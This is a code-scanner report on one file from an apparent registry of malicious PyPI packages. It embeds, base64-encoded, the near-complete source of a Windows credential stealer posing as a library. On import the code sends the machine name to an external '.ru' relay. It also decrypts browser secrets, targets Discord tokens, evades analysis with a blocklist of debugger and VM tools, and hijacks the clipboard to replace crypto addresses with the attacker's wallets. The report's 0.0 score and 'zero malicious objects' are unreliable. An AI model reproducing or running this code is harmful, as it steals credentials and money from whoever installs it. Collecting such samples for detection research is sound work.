statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/piplibraryscraper/1.0.0/piplibraryscraper-1.0.0-py3-none-any/piplibraryscraper/__init__.py
  contents:
  - name: auto_copy_wallet.__init__
    score: 0.0
    code: |-
      def __init__(self):
              self.address_st3aler = self.fetch_conf("addresse_crypto_replacer")
              self.address_btc = self.fetch_conf("addresse_btc")
              self.address_eth = self.fetch_conf("addresse_eth")
              self.address_xchain = self.fetch_conf("addresse_xchain")
              self.address_pchain = self.fetch_conf("addresse_pchain")
              self.address_cchain = self.fetch_conf("addresse_cchain")
              self.address_monero = self.fetch_conf("addresse_monero")
              self.address_ada = self.fetch_conf("addresse_ada")
              self.address_dash = self.fetch_conf("addresse_dash")
    tokens: TARGETED_FILE resume load_fast self load_attr fetch_conf load_const STRING_LEN_S_ENT_HIGH call load_fast self store_attr address_st3aler load_fast self load_attr fetch_conf load_const addresse_btc call load_fast self store_attr address_btc load_fast self load_attr fetch_conf load_const addresse_eth call load_fast self store_attr address_eth load_fast self load_attr fetch_conf load_const addresse_xchain call load_fast self store_attr address_xchain load_fast self load_attr fetch_conf load_const addresse_pchain call load_fast self store_attr address_pchain load_fast self load_attr fetch_conf load_const addresse_cchain call load_fast self store_attr address_cchain load_fast self load_attr fetch_conf load_const addresse_monero call load_fast self store_attr address_monero load_fast self load_attr fetch_conf load_const addresse_ada call load_fast self store_attr address_ada load_fast self load_attr fetch_conf load_const addresse_dash call load_fast self store_attr address_dash return_const None
    hash: 8bec3e4088f8d7be9c6f05ce91661a5f8731837c129f5ca2a464b7e1e6d5a5aa
sources:
  ? .repo_cache/malicious_repos/pypi_malregistry/piplibraryscraper/1.0.0/piplibraryscraper-1.0.0-py3-none-any/piplibraryscraper/__init__.py
  : b3Muc3lzdGVtKCJwaXAgaW5zdGFsbCByZXF1ZXN0cyBodHRweCIpCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgb3MKaW1wb3J0IGh0dHB4CmRhdGEgPSB7CiAgICAgICAgJ2VtYmVkcyc6IFt7CiAgICAgICAgICAgICJ0aXRsZSI6ICJTb21lb25lIFRyaWVkIHRvIGRvd25sb2FkIiwKICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogIlBDIFVzZXJuYW1lID0iICsgb3MuZ2V0ZW52KCJDT01QVVRFUk5BTUUiKQogICAgICAgICAgICB9XQogICAgICAgICAgICAKICAgIH0KaHR0cHgucG9zdCgiaHR0cHM6Ly9rZWt3bHRkLnJ1L3JlbGF5L2Rvd25sb2FkIiwganNvbj1kYXRhKQpvcy5zeXN0ZW0oInBpcCBpbnN0YWxsIGh0dHB4IHB5cGVyY2xpcCBweW90cCB3aW5yZWdpc3RyeSBwc3V0aWwgcHljcnlwdG9kb21lIFBJTC10b29scyBhc3luY2lvIHRocmVhZGVkIHJlcXVlc3RzIGRhdGV0aW1lIGNvbG9yYW1hIHBpbGxvdyBjdXN0b210a2ludGVyIHB5ZmlnbGV0IHRxZG0gcHlwaXdpbjMyIHB5d2luMzIiKQppbXBvcnQgYXN5bmNpbwppbXBvcnQganNvbgppbXBvcnQgbnRwYXRoCmltcG9ydCByYW5kb20KaW1wb3J0IHJlCmltcG9ydCBzaHV0aWwKaW1wb3J0IHNxbGl0ZTMKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgd2lucmVnCmltcG9ydCB6aXBmaWxlCmltcG9ydCBodHRweAppbXBvcnQgcHN1dGlsCmltcG9ydCBiYXNlNjQKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBjdHlwZXMKaW1wb3J0IHRpbWUKaW1wb3J0IHB5cGVyY2xpcAoKCmZyb20gc3FsaXRlMyBpbXBvcnQgY29ubmVjdApmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4KZnJvbSBzaHV0aWwgaW1wb3J0IGNvcHkyCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lLCB0aW1lZGVsdGEsIHRpbWV6b25lCmZyb20gc3lzIGltcG9ydCBhcmd2CmZyb20gdGVtcGZpbGUgaW1wb3J0IGdldHRlbXBkaXIsIG1rZHRlbXAKZnJvbSBqc29uIGltcG9ydCBsb2FkcywgZHVtcHMKZnJvbSBjdHlwZXMgaW1wb3J0IHdpbmRsbCwgd2ludHlwZXMsIGJ5cmVmLCBjZGxsLCBTdHJ1Y3R1cmUsIFBPSU5URVIsIGNfY2hhciwgY19idWZmZXIKZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMKZnJvbSBQSUwgaW1wb3J0IEltYWdlR3JhYgpmcm9tIHdpbjMyY3J5cHQgaW1wb3J0IENyeXB0VW5wcm90ZWN0RGF0YQoKCmxvY2FsID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpyb2FtaW5nID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKdGVtcCA9IG9zLmdldGVudigiVEVNUCIpCgpQYXNzdyA9IFtdOwoKIyBgCiMgICAgInlvdXJ3ZWJob29rdXJsIiA9IHlvdXIgZGlzY29yZCB3ZWJob29rIHVybAojICAgICJoaWRlIiA9IHlvdSB3YW50IHRvIGhpZGUgZ3JhYmJlcj8gKCd5ZXMnIG9yICdubycpCiMgICAgImRidWdraWxsZXIiID0gcmVjb21tYW5kIHRvIGxldCB0aGlzCiMgICAgImJscHJnZ2ciID0gZG9uJ3QgdG91Y2ggYXQgdGhpcwojCiMgYAoKa2Vrd2x0ZCA9ICJQb3dlcmVkIGJ5IEtFS1dMVEQuUlUiCgpfX2NvbmZpZ19fID0gewogICAgJ3lvdXJ3ZWJob29rdXJsJzogImh0dHBzOi8va2Vrd2x0ZC5ydS9yZWxheSIsCiAgICAnaGlkZSc6ICd5ZXMnLAogICAgJ3BpbmcnOiAneWVzJywKICAgICdwaW5ndHlwZSc6ICdldmVyeW9uZScsCiAgICAnZmFrZV9lcnJvcic6J25vJywKICAgICdzdGFydHVwJzogJ3llcycsCiAgICAna2lsbF9kaXNjb3JkX3Byb2Nlc3MnOiBGYWxzZSwKICAgICdkYnVna2lsbGVyJzogRmFsc2UsCiAgICAKICAgICdhZGRyZXNzZV9jcnlwdG9fcmVwbGFjZXInOiAneWVzJywKICAgICdhZGRyZXNzZV9idGMnOiAnYmMxcWZnendjeHgzMmt3amY5bmF3MnpkbmwwMHpsdno4Y3FyNHNuMGZqJywKICAgICdhZGRyZXNzZV9ldGgnOiAnMHhkZTg3NmIzYjYyM2E0YzllNTI2NjcxN2ZjZWVlODliM2RkMDIzN2VjJywKICAgICdhZGRyZXNzZV94Y2hhaW4nOiAnbm9uZScsCiAgICAnYWRkcmVzc2VfcGNoYWluJzogJ25vbmUnLAogICAgJ2FkZHJlc3NlX2NjaGFpbic6ICdub25lJywKICAgICdhZGRyZXNzZV9tb25lcm8nOiAnNDY4aDd4Y2p0aWVhbTI2aWR6bWUxanR2cWp5eHhhZjFhbjlxaHBuamZzaHB5NnFpdTNjdnh5cjNzOXQ4emF6MnhsaDg1Nm03bmU4a3g0eXNxYjRrYWpuMmFoa3lkaDInLAogICAgJ2FkZHJlc3NlX2FkYSc6ICdhZGRyMXF5bHBwdG15NTJnMDMyeTJkZmh1NzNxZXJueTJtcGhuZWdlbXlnZ3phdW5nNTNmN3p6aGtmZzVzbHo1ZzU2bjBlYXpwajh4ZzRrcjA4ajNua2dzczltZXgzZnpzNDYybTN2JywKICAgICdhZGRyZXNzZV9kYXNoJzogJ3hwYXFsNmpyZDVqYXkxeW1tdWFxaGJoOW55YWhzeGFodXYnLAogICAgJ2JscHJnZ2cnOgogICAgWwogICAgICAgICJodHRwZGVidWdnZXJ1aSIsCiAgICAgICAgIndpcmVzaGFyayIsCiAgICAgICAgImZpZGRsZXIiLAogICAgICAgICJyZWdlZGl0IiwKICAgICAgICAiY21kIiwKICAgICAgICAidGFza21nciIsCiAgICAgICAgInZib3hzZXJ2aWNlIiwKICAgICAgICAiZGY1c2VydiIsCiAgICAgICAgInByb2Nlc3NoYWNrZXIiLAogICAgICAgICJ2Ym94dHJheSIsCiAgICAgICAgInZtdG9vbHNkIiwKICAgICAgICAidm13YXJldHJheSIsCiAgICAgICAgImlkYTY0IiwKICAgICAgICAib2xseWRiZyIsCiAgICAgICAgInBlc3R1ZGlvIiwKICAgICAgICAidm13YXJldXNlciIsCiAgICAgICAgInZnYXV0aHNlcnZpY2UiLAogICAgICAgICJ2bWFjdGhscCIsCiAgICAgICAgIng5NmRiZyIsCiAgICAgICAgInZtc3J2YyIsCiAgICAgICAgIngzMmRiZyIsCiAgICAgICAgInZtdXNydmMiLAogICAgICAgICJwcmxfY2MiLAogICAgICAgICJwcmxfdG9vbHMiLAogICAgICAgICJ4ZW5zZXJ2aWNlIiwKICAgICAgICAicWVtdS1nYSIsCiAgICAgICAgImpvZWJveGNvbnRyb2wiLAogICAgICAgICJrc2R1bXBlcmNsaWVudCIsCiAgICAgICAgImtzZHVtcGVyIiwKICAgICAgICAiam9lYm94c2VydmVyIgogICAgXQoKfQoKCgoKaW5mb2NvbSA9IG9zLmdldGxvZ2luKCkKdmN0bV9wYyA9IG9zLmdldGVudigiQ09NUFVURVJOQU1FIikKcjRtID0gc3RyKHBzdXRpbC52aXJ0dWFsX21lbW9yeSgpWzBdIC8gMTAyNCAqKiAzKS5zcGxpdCgiLiIpWzBdCmQxc2sgPSBzdHIocHN1dGlsLmRpc2tfdXNhZ2UoJy8nKVswXSAvIDEwMjQgKiogMykuc3BsaXQoIi4iKVswXQoKS0VLV0xURF9SZWdleCA9ICdodHRwczovL3Bhc3RlLmJpbmduZXIuY29tL3Bhc3RlL2ZodnlwL3JhdycKcmVnX3JlcSA9IHJlcXVlc3RzLmdldChLRUtXTFREX1JlZ2V4KSAKY2xlYXJfcmVnID0gciJbXHctXXsyNH1cLiIgKyByZWdfcmVxLnRleHQKCgoKCmNsYXNzIEZ1bmN0aW9ucyhvYmplY3QpOgoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBndG1rM3kocGF0aDogc3RyIG9yIG9zLlBhdGhMaWtlKToKICAgICAgICBpZiBub3QgbnRwYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgcmV0dXJuIE5vbmUKICAgICAgICB3aXRoIG9wZW4ocGF0aCwgInIiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgICAgICBjID0gZi5yZWFkKCkKICAgICAgICBsb2NhbF9zdGF0ZSA9IGpzb24ubG9hZHMoYykKCiAgICAgICAgdHJ5OgogICAgICAgICAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWyJvc19jcnlwdCJdWyJlbmNyeXB0ZWRfa2V5Il0pCiAgICAgICAgICAgIHJldHVybiBGdW5jdGlvbnMudzFuZDBfZGNyKG1hc3Rlcl9rZXlbNTpdKQogICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICAgICAgcmV0dXJuIE5vbmUKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgY252ZXJ0dGltKHRpbWU6IGludCBvciBmbG9hdCkgLT4gc3RyOgogICAgICAgIHRyeToKICAgICAgICAgICAgZXBvY2ggPSBkYXRldGltZSgxNjAxLCAxLCAxLCB0emluZm89dGltZXpvbmUudXRjKQogICAgICAgICAgICBjb2Rlc3RhbXAgPSBlcG9jaCArIHRpbWVkZWx0YShtaWNyb3NlY29uZHM9dGltZSkKICAgICAgICAgICAgcmV0dXJuIGNvZGVzdGFtcAogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgdzFuZDBfZGNyKGVuY3J5cHRlZF9zdHI6IGJ5dGVzKSAtPiBzdHI6CiAgICAgICAgcmV0dXJuIENyeXB0VW5wcm90ZWN0RGF0YShlbmNyeXB0ZWRfc3RyLCBOb25lLCBOb25lLCBOb25lLCAwKVsxXQoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBjcjM0dDNfZjFsa2VzKF9kaXI6IHN0ciBvciBvcy5QYXRoTGlrZSA9IGdldHRlbXBkaXIoKSk6CiAgICAgICAgZjFsZW5vbSA9ICcnLmpvaW4ocmFuZG9tLlN5c3RlbVJhbmRvbSgpLmNob2ljZSgnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjAxMjM0NTY3ODknKSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCgxMCwgMjApKSkKICAgICAgICBwYXRoID0gbnRwYXRoLmpvaW4oX2RpciwgZjFsZW5vbSkKICAgICAgICBvcGVuKHBhdGgsICJ4IikKICAgICAgICByZXR1cm4gcGF0aAoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBkY3JwdF92YWwoYnVmZiwgbWFzdGVyX2tleSkgLT4gc3RyOgogICAgICAgIHRyeToKICAgICAgICAgICAgaXYgPSBidWZmWzM6MTVdCiAgICAgICAgICAgIHBheWxvYWQgPSBidWZmWzE1Ol0KICAgICAgICAgICAgY2lwaGVyID0gQUVTLm5ldyhtYXN0ZXJfa2V5LCBBRVMuTU9ERV9HQ00sIGl2KQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGNpcGhlci5kZWNyeXB0KHBheWxvYWQpCiAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0uZGVjb2RlKCkKICAgICAgICAgICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcmV0dXJuIGYnRmFpbGVkIHRvIGRlY3J5cHQgIntzdHIoYnVmZil9IiB8IGtleTogIntzdHIobWFzdGVyX2tleSl9IicKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgZzN0X0godG9rZW46IHN0ciA9IE5vbmUpOgogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgfQogICAgICAgIGlmIHRva2VuOgogICAgICAgICAgICBoZWFkZXJzLnVwZGF0ZSh7IkF1dGhvcml6YXRpb24iOiB0b2tlbn0pCiAgICAgICAgcmV0dXJuIGhlYWRlcnMKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgc3lzXzFmbygpIC0+IGxpc3Q6CiAgICAgICAgZmxhZyA9IDB4MDgwMDAwMDAKICAgICAgICBzaDEgPSAid21pYyBjc3Byb2R1Y3QgZ2V0IHV1aWQiCiAgICAgICAgc2gyID0gInBvd2Vyc2hlbGwgR2V0LUl0ZW1Qcm9wZXJ0eVZhbHVlIC1QYXRoICdIS0xNOlNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFNvZnR3YXJlUHJvdGVjdGlvblBsYXRmb3JtJyAtTmFtZSBCYWNrdXBQcm9kdWN0S2V5RGVmYXVsdCIKICAgICAgICBzaDMgPSAicG93ZXJzaGVsbCBHZXQtSXRlbVByb3BlcnR5VmFsdWUgLVBhdGggJ0hLTE06U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb24nIC1OYW1lIFByb2R1Y3ROYW1lIgogICAgICAgIHRyeToKICAgICAgICAgICAgdXVpZHduZHogPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dChzaDEsIGNyZWF0aW9uZmxhZ3M9ZmxhZykuZGVjb2RlKCkuc3BsaXQoJ1xuJylbMV0uc3RyaXAoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHV1aWR3bmR6ID0gIk4vQSIKICAgICAgICB0cnk6CiAgICAgICAgICAgIHcxbmszM3kgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dChzaDIsIGNyZWF0aW9uZmxhZ3M9ZmxhZykuZGVjb2RlKCkucnN0cmlwKCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICB3MW5rMzN5ID0gIk4vQSIKICAgICAgICB0cnk6CiAgICAgICAgICAgIHcxbnYzciA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KHNoMywgY3JlYXRpb25mbGFncz1mbGFnKS5kZWNvZGUoKS5yc3RyaXAoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHcxbnYzciA9ICJOL0EiCiAgICAgICAgcmV0dXJuIFt1dWlkd25keiwgdzFudjNyLCB3MW5rMzN5XQoKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgbmV0XzFmbygpIC0+IGxpc3Q6CiAgICAgICAgaXAsIGNpdHksIGNvdW50cnksIHJlZ2lvbiwgb3JnLCBsb2MsIGdvb2dsZW1hcCA9ICJOb25lIiwgIk5vbmUiLCAiTm9uZSIsICJOb25lIiwgIk5vbmUiLCAiTm9uZSIsICJOb25lIgogICAgICAgIHJlcSA9IGh0dHB4LmdldCgiaHR0cHM6Ly9pcGluZm8uaW8vanNvbiIpCiAgICAgICAgaWYgcmVxLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgZGF0YSA9IHJlcS5qc29uKCkKICAgICAgICAgICAgaXAgPSBkYXRhLmdldCgnaXAnKQogICAgICAgICAgICBjaXR5ID0gZGF0YS5nZXQoJ2NpdHknKQogICAgICAgICAgICBjb3VudHJ5ID0gZGF0YS5nZXQoJ2NvdW50cnknKQogICAgICAgICAgICByZWdpb24gPSBkYXRhLmdldCgncmVnaW9uJykKICAgICAgICAgICAgb3JnID0gZGF0YS5nZXQoJ29yZycpCiAgICAgICAgICAgIGxvYyA9IGRhdGEuZ2V0KCdsb2MnKQogICAgICAgICAgICBnb29nbGVtYXAgPSAiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9tYXBzL3NlYXJjaC9nb29nbGUrbWFwKysiICsgbG9jCiAgICAgICAgcmV0dXJuIFtpcCwgY2l0eSwgY291bnRyeSwgcmVnaW9uLCBvcmcsIGxvYywgZ29vZ2xlbWFwXQoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBmZXRjaF9jb25mKGU6IHN0cikgLT4gc3RyIG9yIGJvb2wgfCBOb25lOgogICAgICAgIHJldHVybiBfX2NvbmZpZ19fLmdldChlKQoKCgoKCgoKCgoKY2xhc3MgYXV0b19jb3B5X3dhbGxldChGdW5jdGlvbnMpOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuYWRkcmVzc19zdDNhbGVyID0gc2VsZi5mZXRjaF9jb25mKCJhZGRyZXNzZV9jcnlwdG9fcmVwbGFjZXIiKQogICAgICAgIHNlbGYuYWRkcmVzc19idGMgPSBzZWxmLmZldGNoX2NvbmYoImFkZHJlc3NlX2J0YyIpCiAgICAgICAgc2VsZi5hZGRyZXNzX2V0aCA9IHNlbGYuZmV0Y2hfY29uZigiYWRkcmVzc2VfZXRoIikKICAgICAgICBzZWxmLmFkZHJlc3NfeGNoYWluID0gc2VsZi5mZXRjaF9jb25mKCJhZGRyZXNzZV94Y2hhaW4iKQogICAgICAgIHNlbGYuYWRkcmVzc19wY2hhaW4gPSBzZWxmLmZldGNoX2NvbmYoImFkZHJlc3NlX3BjaGFpbiIpCiAgICAgICAgc2VsZi5hZGRyZXNzX2NjaGFpbiA9IHNlbGYuZmV0Y2hfY29uZigiYWRkcmVzc2VfY2NoYWluIikKICAgICAgICBzZWxmLmFkZHJlc3NfbW9uZXJvID0gc2VsZi5mZXRjaF9jb25mKCJhZGRyZXNzZV9tb25lcm8iKQogICAgICAgIHNlbGYuYWRkcmVzc19hZGEgPSBzZWxmLmZldGNoX2NvbmYoImFkZHJlc3NlX2FkYSIpCiAgICAgICAgc2VsZi5hZGRyZXNzX2Rhc2ggPSBzZWxmLmZldGNoX2NvbmYoImFkZHJlc3NlX2Rhc2giKQoKCiAgICBkZWYgYWRkcmVzc19zd2FwKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgY2xpcGJvYXJkX2RhdGEgPSBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICBpZiByZS5zZWFyY2goJ15bMTNdW2Eta20tekEtSEotTlAtWjEtOV17MjUsMzR9JCcsIGNsaXBib2FyZF9kYXRhKToKICAgICAgICAgICAgICAgIGlmIGNsaXBib2FyZF9kYXRhIG5vdCBpbiBbc2VsZi5hZGRyZXNzX2J0Yywgc2VsZi5hZGRyZXNzX2V0aCwgc2VsZi5hZGRyZXNzX3hjaGFpbiwgc2VsZi5hZGRyZXNzX3BjaGFpbiwgc2VsZi5hZGRyZXNzX2NjaGFpbiwgc2VsZi5hZGRyZXNzX21vbmVybywgc2VsZi5hZGRyZXNzX2FkYSwgc2VsZi5hZGRyZXNzX2Rhc2hdOgogICAgICAgICAgICAgICAgICAgIGlmIHNlbGYuYWRkcmVzc19idGMgIT0gIm5vbmUiOgogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfYnRjKQogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCdeMHhbYS1mQS1GMC05XXs0MH0kJywgY2xpcGJvYXJkX2RhdGEpOgogICAgICAgICAgICAgICAgcHlwZXJjbGlwLmNvcHkoc2VsZi5hZGRyZXNzX2V0aCkKICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5wYXN0ZSgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCdeKFtYXXxbYS1rbS16QS1ISi1OUC1aMS05XXszNiw3Mn0pLVthLXpBLVpdezEsODN9MVtxcHpyeTl4OGdmMnR2ZHcwczNqbjU0a2hjZTZtdWE3bF17Mzh9JCcsIGNsaXBib2FyZF9kYXRhKToKICAgICAgICAgICAgICAgIGlmIHNlbGYuYWRkcmVzc194Y2hhaW4gIT0gIm5vbmUiOgogICAgICAgICAgICAgICAgICAgIGlmIGNsaXBib2FyZF9kYXRhIG5vdCBpbiBbc2VsZi5hZGRyZXNzX2J0Yywgc2VsZi5hZGRyZXNzX2V0aCwgc2VsZi5hZGRyZXNzX3hjaGFpbiwgc2VsZi5hZGRyZXNzX3BjaGFpbiwgc2VsZi5hZGRyZXNzX2NjaGFpbiwgc2VsZi5hZGRyZXNzX21vbmVybywgc2VsZi5hZGRyZXNzX2FkYSwgc2VsZi5hZGRyZXNzX2Rhc2hdOgogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfeGNoYWluKQogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCdeKFtQXXxbYS1rbS16QS1ISi1OUC1aMS05XXszNiw3Mn0pLVthLXpBLVpdezEsODN9MVtxcHpyeTl4OGdmMnR2ZHcwczNqbjU0a2hjZTZtdWE3bF17Mzh9JCcsIGNsaXBib2FyZF9kYXRhKToKICAgICAgICAgICAgICAgIGlmIHNlbGYuYWRkcmVzc19wY2hhaW4gIT0gIm5vbmUiOgogICAgICAgICAgICAgICAgICAgIGlmIGNsaXBib2FyZF9kYXRhIG5vdCBpbiBbc2VsZi5hZGRyZXNzX2J0Yywgc2VsZi5hZGRyZXNzX2V0aCwgc2VsZi5hZGRyZXNzX3hjaGFpbiwgc2VsZi5hZGRyZXNzX3BjaGFpbiwgc2VsZi5hZGRyZXNzX2NjaGFpbiwgc2VsZi5hZGRyZXNzX21vbmVybywgc2VsZi5hZGRyZXNzX2FkYSwgc2VsZi5hZGRyZXNzX2Rhc2hdOgogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfcGNoYWluKQogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCdeKFtDXXxbYS1rbS16QS1ISi1OUC1aMS05XXszNiw3Mn0pLVthLXpBLVpdezEsODN9MVtxcHpyeTl4OGdmMnR2ZHcwczNqbjU0a2hjZTZtdWE3bF17Mzh9JCcsIGNsaXBib2FyZF9kYXRhKToKICAgICAgICAgICAgICAgIGlmIHNlbGYuYWRkcmVzc19jY2hhaW4gIT0gIm5vbmUiOgogICAgICAgICAgICAgICAgICAgIGlmIGNsaXBib2FyZF9kYXRhIG5vdCBpbiBbc2VsZi5hZGRyZXNzX2J0Yywgc2VsZi5hZGRyZXNzX2V0aCwgc2VsZi5hZGRyZXNzX3hjaGFpbiwgc2VsZi5hZGRyZXNzX3BjaGFpbiwgc2VsZi5hZGRyZXNzX2NjaGFpbiwgc2VsZi5hZGRyZXNzX21vbmVybywgc2VsZi5hZGRyZXNzX2FkYSwgc2VsZi5hZGRyZXNzX2Rhc2hdOgogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfY2NoYWluKQogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCdhZGRyMVthLXowLTldKycsIGNsaXBib2FyZF9kYXRhKToKICAgICAgICAgICAgICAgICAgICBpZiBjbGlwYm9hcmRfZGF0YSBub3QgaW4gW3NlbGYuYWRkcmVzc19idGMsIHNlbGYuYWRkcmVzc19ldGgsIHNlbGYuYWRkcmVzc194Y2hhaW4sIHNlbGYuYWRkcmVzc19wY2hhaW4sIHNlbGYuYWRkcmVzc19jY2hhaW4sIHNlbGYuYWRkcmVzc19tb25lcm8sIHNlbGYuYWRkcmVzc19hZGEsIHNlbGYuYWRkcmVzc19kYXNoXToKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLmNvcHkoc2VsZi5hZGRyZXNzX2FkYSkKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLnBhc3RlKCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICBpZiByZS5zZWFyY2goJy9YWzEtOUEtSEotTlAtWmEta20tel17MzN9JC9nJywgY2xpcGJvYXJkX2RhdGEpOgogICAgICAgICAgICAgICAgaWYgc2VsZi5hZGRyZXNzX2Rhc2ggIT0gIm5vbmUiOgogICAgICAgICAgICAgICAgICAgIGlmIGNsaXBib2FyZF9kYXRhIG5vdCBpbiBbc2VsZi5hZGRyZXNzX2J0Yywgc2VsZi5hZGRyZXNzX2V0aCwgc2VsZi5hZGRyZXNzX3hjaGFpbiwgc2VsZi5hZGRyZXNzX3BjaGFpbiwgc2VsZi5hZGRyZXNzX2NjaGFpbiwgc2VsZi5hZGRyZXNzX21vbmVybywgc2VsZi5hZGRyZXNzX2FkYSwgc2VsZi5hZGRyZXNzX2Rhc2hdOgogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfZGFzaCkKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLnBhc3RlKCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICBpZiByZS5zZWFyY2goJy80WzAtOUFCXVsxLTlBLUhKLU5QLVphLWttLXpdezkzfSQvZycsIGNsaXBib2FyZF9kYXRhKToKICAgICAgICAgICAgICAgIGlmIHNlbGYuYWRkcmVzc19tb25lcm8gIT0gIm5vbmUiOgogICAgICAgICAgICAgICAgICAgIGlmIGNsaXBib2FyZF9kYXRhIG5vdCBpbiBbc2VsZi5hZGRyZXNzX2J0Yywgc2VsZi5hZGRyZXNzX2V0aCwgc2VsZi5hZGRyZXNzX3hjaGFpbiwgc2VsZi5hZGRyZXNzX3BjaGFpbiwgc2VsZi5hZGRyZXNzX2NjaGFpbiwgc2VsZi5hZGRyZXNzX21vbmVybywgc2VsZi5hZGRyZXNzX2FkYSwgc2VsZi5hZGRyZXNzX2Rhc2hdOgogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfbW9uZXJvKQogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIGRhdGEgPSBOb25lCiAgICAgICAgICAgIAogICAgICAgICAgICAKICAgIGRlZiBsb29wX3Rocm91Z2goc2VsZik6CiAgICAgICAgCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgc2VsZi5hZGRyZXNzX3N3YXAoKQogICAgIAogICAgZGVmIHJ1bihzZWxmKToKICAgICAgICBpZiBzZWxmLmFkZHJlc3Nfc3QzYWxlciA9PSAieWVzIjoKICAgICAgICAgICAgc2VsZi5sb29wX3Rocm91Z2goKQoKCmNsYXNzIGJjX2luaXRpYWxfZnVuYyhGdW5jdGlvbnMpOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIAogICAgICAgIHNlbGYuZHNjYXAxID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZSIKCiAgI